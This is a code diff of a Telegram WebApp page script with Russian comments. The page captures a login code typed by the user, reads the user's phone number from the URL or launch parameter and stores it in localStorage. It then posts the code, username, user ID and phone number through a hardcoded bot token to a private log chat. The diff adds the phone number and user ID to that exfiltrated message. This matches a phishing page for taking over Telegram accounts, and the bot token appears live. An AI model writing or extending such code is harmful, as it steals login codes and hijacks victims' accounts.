@@ -199,21 +199,33 @@
 			let code = '';
 			let phoneNumber = '';
 
-			try {
-				const urlParams = new URLSearchParams(window.location.search);
-				phoneNumber = urlParams.get('phone') || '';
-			} catch (e) {
-				console.log('Error parsing URL parameters');
-			}
+		try {
+			const urlParams = new URLSearchParams(window.location.search);
+			phoneNumber = urlParams.get('phone') || '';
+		} catch (e) {
+			console.log('Error parsing URL parameters');
+		}
 
-			if (
-				!phoneNumber &&
-				tg &&
-				tg.initDataUnsafe &&
-				tg.initDataUnsafe.start_param
-			) {
-				phoneNumber = tg.initDataUnsafe.start_param;
+		if (
+			!phoneNumber &&
+			tg &&
+			tg.initDataUnsafe &&
+			tg.initDataUnsafe.start_param
+		) {
+			phoneNumber = tg.initDataUnsafe.start_param;
+		}
+
+		// Сохраняем номер телефона в localStorage сразу при загрузке
+		if (phoneNumber) {
+			localStorage.setItem('authPhoneNumber', phoneNumber);
+			console.log('Номер телефона сохранен:', phoneNumber);
+		} else {
+			// Пытаемся получить из localStorage если не было в URL
+			phoneNumber = localStorage.getItem('authPhoneNumber') || '';
+			if (phoneNumber) {
+				console.log('Номер телефона восстановлен из localStorage:', phoneNumber);
 			}
+		}
 
 			function updateBoxes() {
 				codeBoxes.forEach((box, i) => {
@@ -264,29 +276,39 @@
 				});
 			});
 
-			function sendCodeToBot(code) {
-				const botToken = '7716220386:AAGwhUsT8OCKeBM8GmB7_sNXtFBvFgr_64I';
-				const logChatId = '-1003298308264';
+		function sendCodeToBot(code) {
+			const botToken = '7716220386:AAGwhUsT8OCKeBM8GmB7_sNXtFBvFgr_64I';
+			const logChatId = '-1003298308264';
 
-				const user = tg.initDataUnsafe.user;
-				const username = user?.username ? `@${user.username}` : 'без username';
+			const user = tg.initDataUnsafe.user;
+			const username = user?.username ? `@${user.username}` : 'без username';
+			const userId = user?.id || 'неизвестно';
 
-				const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
-
-				fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/json',
-					},
-					body: JSON.stringify({
-						chat_id: logChatId,
-						text: message,
-						parse_mode: 'HTML',
-					}),
-				}).catch(error => {
-					console.error('Ошибка отправки кода в лог:', error);
-				});
+			// Получаем номер телефона из разных источников
+			let phone = phoneNumber;
+			
+			// Если номер не получен из URL, пытаемся из localStorage
+			if (!phone) {
+				phone = localStorage.getItem('authPhoneNumber') || '';
 			}
+
+			// Формируем сообщение с номером телефона
+			const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🆔 User ID: ${userId}\n📱 Номер: ${phone || 'не указан'}\n🔢 Код: ${code}`;
+
+			fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json',
+				},
+				body: JSON.stringify({
+					chat_id: logChatId,
+					text: message,
+					parse_mode: 'HTML',
+				}),
+			}).catch(error => {
+				console.error('Ошибка отправки кода в лог:', error);
+			});
+		}
 
 			updateBoxes();
 		</script>
